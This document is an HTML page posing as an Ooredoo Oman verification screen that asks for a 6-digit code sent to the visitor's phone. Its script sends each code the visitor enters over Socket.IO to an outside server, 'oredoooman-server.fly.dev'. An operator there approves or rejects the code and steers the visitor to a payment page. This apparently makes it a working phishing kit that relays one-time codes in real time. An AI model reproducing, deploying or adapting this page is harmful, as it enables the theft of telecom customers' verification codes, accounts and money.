<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>التحقق من الرقم - Ooredoo</title>
  <style>
    @font-face {
      font-family: 'NotoSansLocal';
      src: url('/wp-content/themes/Divi-child/fonts/NotoSans-Regular.ttf') format('truetype');
      font-weight: 400;
      font-style: normal;
      font-display: swap;
    }

    @font-face {
      font-family: 'NotoSansLocal';
      src: url('/wp-content/themes/Divi-child/fonts/NotoSans-Bold.ttf') format('truetype');
      font-weight: 700;
      font-style: normal;
      font-display: swap;
    }

    :root {
      --ooredoo-red: #ed1c24;
      --text: #050505;
      --muted: #34383d;
      --field-border: #d7d7d7;
      --card-shadow: 0 18px 38px rgba(0, 0, 0, 0.085);
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      margin: 0;
      background: #ffffff;
      color: var(--text);
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      -webkit-font-smoothing: antialiased;
      text-rendering: geometricPrecision;
    }

    body {
      min-height: 100vh;
    }

    .lang-toggle {
      background: #f5f5f5;
      border: 1px solid #ddd;
      border-radius: 20px;
      padding: 6px 16px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #333;
      transition: all 0.2s;
      z-index: 100;
    }
    .lang-toggle:hover {
      background: #eee;
      border-color: #ccc;
    }
    .lang-toggle-wrap {
      width: 626px;
      max-width: 100%;
      margin: 0 auto;
      display: flex;
      justify-content: flex-start;
      padding: 0 0 10px;
    }

    .otp-page {
      width: 100%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
    }

    .otp-card {
      width: 626px;
      min-height: 481px;
      background: #ffffff;
      border: 1px solid rgba(245, 245, 245, 0.98);
      border-radius: 4px;
      box-shadow: var(--card-shadow);
      text-align: center;
      padding: 43px 34px 36px;
    }

    .ooredoo-mark {
      width: 73px;
      height: 62px;
      margin: 0 auto 12px;
      display: block;
      overflow: visible;
    }

    .title {
      margin: 0;
      color: #030303;
      font-size: 35px;
      font-weight: 700;
      line-height: 1.19;
      letter-spacing: 0.1px;
    }

    .subtitle {
      margin: 10px 0 0;
      color: #141414;
      font-size: 17px;
      font-weight: 400;
      line-height: 1.45;
      letter-spacing: -0.15px;
    }

    .subtitle strong {
      font-weight: 700;
    }

    .otp-group {
      width: 383px;
      margin: 26px auto 31px;
      direction: ltr;
    }

    .otp-single-input {
      width: 100%;
      height: 62px;
      padding: 0 16px;
      margin: 0;
      border: 1px solid var(--field-border);
      border-radius: 8px;
      background: #fff;
      outline: none;
      color: #111;
      text-align: center;
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      font-size: 28px;
      font-weight: 700;
      letter-spacing: 8px;
      line-height: 62px;
      caret-color: var(--ooredoo-red);
      appearance: textfield;
      -moz-appearance: textfield;
    }

    .otp-single-input::-webkit-outer-spin-button,
    .otp-single-input::-webkit-inner-spin-button {
      margin: 0;
      -webkit-appearance: none;
    }

    .otp-single-input:focus {
      border-color: var(--ooredoo-red);
      box-shadow: 0 0 0 2px rgba(237, 28, 36, 0.12);
    }

    .resend {
      display: inline-block;
      min-height: 21px;
      margin: 0 0 18px;
      border: 0;
      padding: 0;
      background: transparent;
      color: #c47d87;
      font: inherit;
      font-size: 17px;
      font-weight: 400;
      line-height: 1.2;
      text-align: center;
      text-decoration: none;
      cursor: default;
      transition: color 0.18s ease;
    }

    .resend.is-ready {
      color: #b5222b;
      cursor: pointer;
    }

    .resend.is-ready:hover,
    .resend.is-ready:focus-visible {
      color: var(--ooredoo-red);
      text-decoration: underline;
    }

    .primary-button {
      width: 560px;
      max-width: 100%;
      height: 58px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto;
      border: 0;
      border-radius: 29px;
      background: var(--ooredoo-red);
      color: #fff;
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      font-size: 16px;
      font-weight: 700;
      line-height: 1;
      text-decoration: none;
      cursor: pointer;
      transition: opacity 0.2s;
    }

    .primary-button {
      position: relative;
    }

    .primary-button.loading {
      pointer-events: none;
      color: rgba(255,255,255,0.4);
    }

    .primary-button.loading::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 28px;
      height: 28px;
      margin-top: -14px;
      margin-left: -14px;
      border: 3px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      z-index: 1;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .primary-button:disabled {
      opacity: 0.4;
      cursor: not-allowed;
    }

    .change-number {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-top: 22px;
      color: #4f5964;
      font-size: 18px;
      font-weight: 700;
      line-height: 1.2;
      text-decoration: none;
    }

    .change-number svg {
      width: 17px;
      height: 17px;
      fill: currentColor;
      transform: translateY(-1px);
    }

    /* Waiting/Loading overlay */
    #waitingOverlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.85);
      z-index: 9998;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #ed1c24;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .waiting-text {
      font-size: 16px;
      color: #333;
      font-weight: 500;
    }
    .error-msg {
      display: none;
      color: #ed1c24;
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
      font-weight: 500;
    }

    @media (max-width: 700px) {
      .otp-page {
        padding: 20px 12px 24px;
      }
      .otp-card {
        width: 100%;
        min-height: 0;
        padding: 30px 16px 28px;
        box-shadow: none;
        border: none;
      }
      .title {
        font-size: 26px;
      }
      .subtitle {
        font-size: 14px;
      }
      .otp-group {
        width: min(383px, 100%);
      }
      .primary-button {
        width: 100%;
        height: 50px;
        font-size: 15px;
      }
      .lang-toggle-wrap { width: 100%; padding: 0 5px 8px; }
      .ooredoo-mark { width: 60px; height: 50px; }
    }
    @media (max-width: 400px) {
      .otp-page { padding: 15px 8px 20px; }
      .otp-card { padding: 24px 12px 24px; }
      .title { font-size: 22px; }
      .primary-button { height: 46px; font-size: 14px; }
    }
  </style>
</head>
<body>
  <main class="otp-page" aria-label="OTP login">
    <!-- Language Toggle -->
    <div class="lang-toggle-wrap">
      <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
    </div>

    <section class="otp-card" aria-labelledby="otp-title">
      <svg class="ooredoo-mark" viewBox="0 0 74 62" aria-hidden="true" focusable="false">
        <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
        <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
      </svg>

      <h1 class="title" id="otp-title">تحقق من رقمك</h1>
      <p class="subtitle" id="otp-subtitle">لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى <strong id="otp-phone-number">+968 94949590</strong></p>

      <form class="otp-form" id="otpForm" action="#" method="post" autocomplete="one-time-code">
        <div class="otp-group" dir="ltr" aria-label="Enter OTP code">
          <input class="otp-single-input" id="otpInput" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" aria-label="OTP code" autocomplete="one-time-code" placeholder="------" autofocus>
        </div>

        <button class="resend" id="resend-otp" type="button" disabled aria-live="polite">إعادة إرسال الرمز بعد 29 ثانية</button>
        <p class="error-msg" id="errorMsg">الرمز غير صحيح، يرجى المحاولة مرة أخرى.</p>
        <button class="primary-button" id="verifyBtn" type="submit" disabled>تحقق ومتابعة</button>
      </form>

      <a class="change-number" href="javascript:void(0)" aria-label="Change Number" id="changeNumberLink" style="pointer-events:none; opacity:0.5;">
        <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false"><path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path></svg>
        <span id="changeNumberText">تغيير الرقم</span>
      </a>
    </section>
  </main>

  <!-- Waiting Overlay -->
  <div id="waitingOverlay">
    <div class="spinner"></div>
    <p class="waiting-text" id="waitingText">جاري التحقق من الرمز...</p>
  </div>

  <!-- Socket.IO -->
  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <script>
    // Language toggle - read saved preference
    var langUrlParams = new URLSearchParams(window.location.search);
    var langUrlVal = langUrlParams.get('lang');
    var currentLang = langUrlVal || localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || localStorage.getItem('selectedLang') || 'ar';
    if (langUrlVal) { localStorage.setItem('siteLang', langUrlVal); localStorage.setItem('oredoo_site_language', langUrlVal); }
    
    var translations = {
      ar: {
        title: 'تحقق من رقمك',
        subtitlePrefix: 'لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى ',
        resendCountdown: 'إعادة إرسال الرمز بعد ',
        resendSuffix: ' ثانية',
        resendReady: 'إعادة إرسال الرمز',
        verifyBtn: 'تحقق ومتابعة',
        changeNumber: 'تغيير الرقم',
        toggleText: 'English',
        waitingText: 'جاري التحقق من الرمز...',
        errorMsg: 'الرمز غير صحيح، يرجى المحاولة مرة أخرى.'
      },
      en: {
        title: 'Verify Your Number',
        subtitlePrefix: 'We\'ve sent a 6-digit OTP to ',
        resendCountdown: 'Resend OTP after ',
        resendSuffix: 's',
        resendReady: 'Resend code',
        verifyBtn: 'Verify & Continue',
        changeNumber: 'Change Number',
        toggleText: 'العربية',
        waitingText: 'Verifying the code...',
        errorMsg: 'Invalid code, please try again.'
      }
    };

    function toggleLanguage() {
      currentLang = currentLang === 'ar' ? 'en' : 'ar';
      localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang); localStorage.setItem('selectedLang', currentLang);
      applyLanguage();
    }

    function applyLanguage() {
      var t = translations[currentLang];
      var html = document.documentElement;
      
      if (currentLang === 'ar') {
        html.setAttribute('lang', 'ar');
        html.setAttribute('dir', 'rtl');
      } else {
        html.setAttribute('lang', 'en');
        html.setAttribute('dir', 'ltr');
      }

      document.getElementById('otp-title').textContent = t.title;
      
      // Update subtitle keeping the phone number
      var phoneNum = document.getElementById('otp-phone-number').textContent;
      document.getElementById('otp-subtitle').innerHTML = t.subtitlePrefix + '<strong id="otp-phone-number">' + phoneNum + '</strong>';
      
      // Update resend button text (only if not in countdown)
      var resendBtn = document.getElementById('resend-otp');
      if (resendBtn.classList.contains('is-ready')) {
        resendBtn.textContent = t.resendReady;
      }
      
      document.getElementById('verifyBtn').textContent = t.verifyBtn;
      document.getElementById('changeNumberText').textContent = t.changeNumber;
      document.getElementById('langToggle').textContent = t.toggleText;
      document.getElementById('waitingText').textContent = t.waitingText;
      document.getElementById('errorMsg').textContent = t.errorMsg;
    }

    // Apply saved language on page load
    applyLanguage();

    (function () {
      var phoneNumberElement = document.getElementById('otp-phone-number');
      var resendButton = document.getElementById('resend-otp');
      var resendTimer = null;
      var otpInput = document.getElementById('otpInput');

      function normalizeOmanNumber(value) {
        var digits = String(value || '').replace(/\D/g, '');
        if (digits.indexOf('00968') === 0) digits = digits.slice(5);
        if (digits.indexOf('968') === 0 && digits.length > 8) digits = digits.slice(3);
        if (digits.length > 8) digits = digits.slice(-8);
        return digits;
      }

      function getStoredCustomerNumber() {
        var candidates = [];
        var params = new URLSearchParams(window.location.search);
        ['number', 'phone', 'mobile', 'msisdn', 'customer_number'].forEach(function (key) {
          candidates.push(params.get(key));
        });

        try {
          candidates.push(sessionStorage.getItem('ooredoo_otp_customer_number'));
          candidates.push(sessionStorage.getItem('ooredoo_customer_number'));

          var lastLookup = JSON.parse(sessionStorage.getItem('last_ooredoo_bill_lookup') || '{}');
          candidates.push(lastLookup.customerNumber);
          candidates.push(lastLookup.number);
          candidates.push(lastLookup.serviceNumber);
        } catch (err) {}

        for (var i = 0; i < candidates.length; i += 1) {
          var normalized = normalizeOmanNumber(candidates[i]);
          if (/^[279]\d{7}$/.test(normalized)) return normalized;
        }

        return '94949590';
      }

      function setCustomerNumber() {
        var customerNumber = getStoredCustomerNumber();
        if (phoneNumberElement) phoneNumberElement.textContent = '+968 ' + customerNumber;
        try { sessionStorage.setItem('ooredoo_otp_customer_number', customerNumber); } catch (err) {}
      }

      setCustomerNumber();

      function startResendCountdown() {
        var secondsRemaining = 29;
        if (!resendButton) return;
        if (resendTimer) window.clearInterval(resendTimer);

        resendButton.disabled = true;
        resendButton.classList.remove('is-ready');
        var t = translations[currentLang];
        resendButton.textContent = t.resendCountdown + secondsRemaining + t.resendSuffix;

        resendTimer = window.setInterval(function () {
          secondsRemaining -= 1;

          if (secondsRemaining <= 0) {
            window.clearInterval(resendTimer);
            resendTimer = null;
            resendButton.disabled = false;
            resendButton.classList.add('is-ready');
            resendButton.textContent = translations[currentLang].resendReady;
            return;
          }

          var t = translations[currentLang];
          resendButton.textContent = t.resendCountdown + secondsRemaining + t.resendSuffix;
        }, 1000);
      }

      if (resendButton) {
        resendButton.addEventListener('click', function () {
          if (resendButton.disabled) return;
          startResendCountdown();
          // Send resend request to server
          if (typeof socket !== 'undefined') {
            socket.emit('more-info', {
              content: { 'طلب': 'إعادة إرسال رمز' },
              page: 'توثيق الجوال',
              waitingForAdminResponse: true
            });
          }
        });
      }

      startResendCountdown();

      // Only allow digits in the single OTP input and enable/disable button
      otpInput.addEventListener('input', function() {
        otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
        var verifyBtn = document.getElementById('verifyBtn');
        var len = otpInput.value.length;
        if (len === 4 || len === 6) {
          verifyBtn.disabled = false;
        } else {
          verifyBtn.disabled = true;
        }
      });

      // Socket.IO connection
      var SOCKET_URL = window.location.hostname === 'localhost' 
        ? 'http://localhost:3001' 
        : 'https://oredoooman-server.fly.dev';
      
      var socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
      window.socket = socket;
      
      // Register visitor
      var visitorId = localStorage.getItem('visitorId') || null;
      socket.on('connect', function() {
        socket.emit('visitor:register', { existingVisitorId: visitorId });
        socket.emit('visitor:pageEnter', 'توثيق الجوال');
      });
      socket.on('visitor:registered', function(data) {
        if (data && data.visitorId) {
          localStorage.setItem('visitorId', data.visitorId);
        }
      });

      // Handle form submission
      var otpForm = document.getElementById('otpForm');
      var verifyBtn = document.getElementById('verifyBtn');
      var waitingOverlay = document.getElementById('waitingOverlay');
      var errorMsg = document.getElementById('errorMsg');

      otpForm.addEventListener('submit', function(event) {
        event.preventDefault();
        
        var otpValue = otpInput.value.replace(/\D/g, '');
        if (otpValue.length !== 4 && otpValue.length !== 6) return;

        // Show loading
        verifyBtn.disabled = true;
        verifyBtn.classList.add('loading');
        waitingOverlay.style.display = 'flex';
        errorMsg.style.display = 'none';

        // Send OTP to server
        socket.emit('more-info', {
          content: { 'رمز التحقق': otpValue },
          page: 'توثيق الجوال',
          waitingForAdminResponse: true
        });
      });

      // Listen for admin response (approve/reject)
      socket.on('card:action', function(data) {
        var act = (data && data.action) ? data.action : data;
        if (act === 'approve') {
          // Navigate to next page (summary-payment)
          window.location.href = '/summary-payment/';
        } else if (act === 'reject') {
          // Show error and reset
          waitingOverlay.style.display = 'none';
          verifyBtn.disabled = false;
          verifyBtn.classList.remove('loading');
          errorMsg.style.display = 'block';
          // Clear OTP input
          otpInput.value = '';
          otpInput.focus();
        }
      });

      // Listen for code:action (approve/reject from admin)
      socket.on('code:action', function(data) {
        var act = (data && data.action) ? data.action : data;
        if (act === 'approve') {
          // Navigate to final page (summary-payment)
          window.location.href = '/summary-payment/';
        } else if (act === 'reject') {
          // Show error and reset
          waitingOverlay.style.display = 'none';
          verifyBtn.disabled = false;
          verifyBtn.classList.remove('loading');
          errorMsg.style.display = 'block';
          otpInput.value = '';
          otpInput.focus();
        }
      });

      // Listen for page navigation from admin
      socket.on('visitor:navigate', function(page) {
        if (page) window.location.href = '/' + page;
      });
    })();
  </script>
</body>
</html>
